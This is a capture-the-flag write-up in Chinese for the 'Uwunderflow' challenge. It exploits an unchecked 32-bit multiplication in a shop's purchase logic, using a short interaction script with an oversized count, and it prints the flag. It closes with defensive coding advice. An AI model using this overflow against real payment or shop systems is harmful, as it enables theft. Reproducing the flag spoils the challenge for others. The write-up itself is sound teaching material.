# Uwunderflow

## 题目简述

商店用 32 位有符号整数计算购买费用：balance - count * 16。程序只检查结果是否仍足够，却没有验证乘法和减法溢出。提交一个很大的正数可让 count * 16 越过 INT_MAX 变成负数，扣款反而增加余额，再购买 flag。

## 解题过程

选择：

$$
\text{count}=\left\lfloor\frac{2^{31}+100}{16}\right\rfloor+1
=134217735.
$$

在 32 位补码中，乘积发生回绕。随后 balance - cost 把一个负费用减掉，得到很大的正余额。交互脚本先选择购买 uwu，再购买 flag：

~~~python
count = (2**31 + 100) // 16 + 1

io.sendlineafter(b"Your balance:", b"2")
io.sendlineafter(
    b"How many uwus do you want to buy?\n",
    str(count).encode(),
)
io.sendlineafter(b"Your balance:", b"1")
~~~

余额检查被绕过，返回：

~~~text
maple{Uwuniveristy_of_BC}
~~~

## 方法总结

整数溢出是业务逻辑漏洞，也可能进一步变成内存破坏。涉及数量、价格、长度和索引时，应先验证输入范围，再使用带溢出检查的乘法/加减法；不能在溢出已经发生后才比较结果。攻击时应明确变量位宽、有无符号以及编译器语义，而不是用 Python 无限精度结果直接类比。
